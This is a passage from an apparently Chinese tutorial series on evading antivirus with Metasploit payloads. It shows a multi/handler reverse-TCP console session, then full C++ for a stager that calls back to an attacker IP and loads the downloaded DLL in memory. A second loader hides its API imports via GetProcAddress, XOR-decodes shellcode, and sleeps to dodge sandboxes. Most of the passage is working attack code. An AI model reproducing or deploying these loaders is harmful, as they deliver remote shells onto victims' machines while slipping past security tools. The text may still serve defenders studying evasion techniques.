windows&#x2F;patchupdllinject&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.170.138 </span><br><span class="line">LHOST &#x3D;&gt; 192.168.170.138</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 8888</span><br><span class="line">LPORT &#x3D;&gt; 8888</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set DLL ~&#x2F;y.dll</span><br><span class="line">DLL &#x3D;&gt; ~&#x2F;y.dll</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.170.138:8888 </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; </span><br></pre></td></tr></table></figure><p>写代码实现客户端获，获取MSF 生成的DLL</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemoryModule.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAYLOAD_SIZE 1024*512</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(*Module)</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line">PBYTE bFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetPEDLL</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD dwError;</span><br><span class="line">WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET socks;</span><br><span class="line">SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">dwError = GetLastError();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">dwError = GetLastError();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line"><span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line"><span class="built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;192.168.170.138&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">connect</span>(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">&#123;</span><br><span class="line">dwError = GetLastError();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">2650</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">ZeroMemory(bFileBuffer,PAYLOAD_SIZE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">5120</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">closesocket(socks);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件并获取大小</span></span><br><span class="line"><span class="function">DWORD <span class="title">OpenBadCodeDLL</span><span class="params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;</span><br><span class="line">DWORD dwHighFileSize = <span class="number">0</span>;</span><br><span class="line">DWORD dwLowFileSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 打开文件</span></span><br><span class="line">hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line">dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);</span><br><span class="line"><span class="keyword">return</span> dwLowFileSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">HMEMORYMODULE hModule;</span><br><span class="line">Module DllMain;</span><br><span class="line">bFileBuffer = <span class="keyword">new</span> BYTE[PAYLOAD_SIZE];</span><br><span class="line">GetPEDLL();</span><br><span class="line"><span class="comment">// 导入PE文件</span></span><br><span class="line">hModule = MemoryLoadLibrary(bFileBuffer);</span><br><span class="line"><span class="comment">// 如果加载失败，就退出</span></span><br><span class="line"><span class="keyword">if</span>(hModule == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取msg导出函数地址</span></span><br><span class="line">DllMain = (Module)MemoryGetProcAddress(hModule,<span class="string">&quot;DllMain&quot;</span>);</span><br><span class="line"><span class="comment">// 运行msg函数</span></span><br><span class="line">DllMain(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line">DWORD dwThread;</span><br><span class="line">HANDLE hThread = CreateThread(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)DllMain,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;dwThread);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE);</span><br><span class="line"></span><br><span class="line">MemoryFreeLibrary(hModule);</span><br><span class="line"><span class="comment">// 释放PE内存</span></span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p><p>PS:</p><p>不同位数要对应不同的payload，编译平台也要互相对应</p><p>引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p><h1 id="第7课"><a href="#第7课" class="headerlink" title="第7课"></a>第7课</h1><h2 id="导入地址表（IAT）"><a href="#导入地址表（IAT）" class="headerlink" title="导入地址表（IAT）"></a>导入地址表（IAT）</h2><blockquote><p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。 - 来源百度百科</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220160321.png"></p><p>在PE结构中，存在一个导入表，导入表中声明了这个PE文件会载入哪些模块，同时每个模块的结构中又会指向模块中的一些函数名称。这样的组织关系是为了告诉操作系统这些函数的地址在哪里，方便修正调用地址。</p><p>如果一个文件的文件大小在300KB以内，并且导入函数又有<code>Virtual Alloc</code>、<code>CreateThread</code>，且<code>VirtualAlloc</code>的最后一个参数是<code>0x40</code>，那么此文件是高危文件。</p><p><code>0x40</code>被定义在<code>winnt.h</code>中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define PAGE_NOACCESS           0x01    </span><br><span class="line">#define PAGE_READONLY           0x02    </span><br><span class="line">#define PAGE_READWRITE          0x04    </span><br><span class="line">#define PAGE_WRITECOPY          0x08    </span><br><span class="line">#define PAGE_EXECUTE            0x10    </span><br><span class="line">#define PAGE_EXECUTE_READ       0x20    </span><br><span class="line">#define PAGE_EXECUTE_READWRITE  0x40    </span><br><span class="line">#define PAGE_EXECUTE_WRITECOPY  0x80  </span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210220161431763.png)</p><h2 id="GetProcAddress-获取函数地址"><a href="#GetProcAddress-获取函数地址" class="headerlink" title="GetProcAddress 获取函数地址"></a>GetProcAddress 获取函数地址</h2><p><code>GetProcAddress</code>这个API在<code>Kernel32.dll</code>中被导出，主要功能是从一个加载的模块中获取函数的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule, <span class="comment">// 模块句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpProcName <span class="comment">// 函数名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>FARPROC</code>被定义在了<code>minwindef.h</code>中，声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WINAPI      __stdcall</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(FAR WINAPI *FARPROC)</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>跟进它的声明能够发现是一个函数指针，也就是说<code>GetProcAddress</code>返回的是我们要找的函数地址。</p><h2 id="自己写代码获取函数地址"><a href="#自己写代码获取函数地址" class="headerlink" title="自己写代码获取函数地址"></a>自己写代码获取函数地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VirtualAlloc -&gt; VirtualProtect -&gt; CreateThread -&gt; WaitForSingleObject</span><br></pre></td></tr></table></figure><p>这几个函数是比较明显的，并且都在<code>kernel32.dll</code>中导出，我们尝试自己定义他们的函数指针，然后利用<code>GetProcAddress</code>获取函数地址，调用自己的函数名称。</p><p>新建C/C++项目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* ImportVirtualAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* ImportCreateThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">__drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">LPDWORD                 lpThreadId)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* ImportVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI * ImportWaitForSingleObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>然后在<code>main</code>函数中，定义四个函数指针来存放这些函数的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinBase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* ImportVirtualAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* ImportCreateThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">__drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">LPDWORD                 lpThreadId)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* ImportVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* ImportWaitForSingleObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a...&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 增加异或代码 */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++) &#123;</span><br><span class="line"><span class="comment">//Sleep(50);</span></span><br><span class="line">_InterlockedXor8(buf + i, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">NULL, // 基址</span></span><br><span class="line"><span class="comment">800,  // 大小</span></span><br><span class="line"><span class="comment">MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)MyVirtualAlloc(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">shellcode_size,</span><br><span class="line">MEM_COMMIT,</span><br><span class="line">PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">CopyMemory(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">MyVirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = MyCreateThread(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">MyWaitForSingleObject(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220162832.png"></p><h1 id="第八课"><a href="#第八课" class="headerlink" title="第八课"></a>第八课</h1><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>一般情况下，C/C++程序中的<strong>字符串常量会被硬编码到程序中（.data段，也就是数据段）</strong>，尤其是全局变量最容易被定位到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> global_string[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span 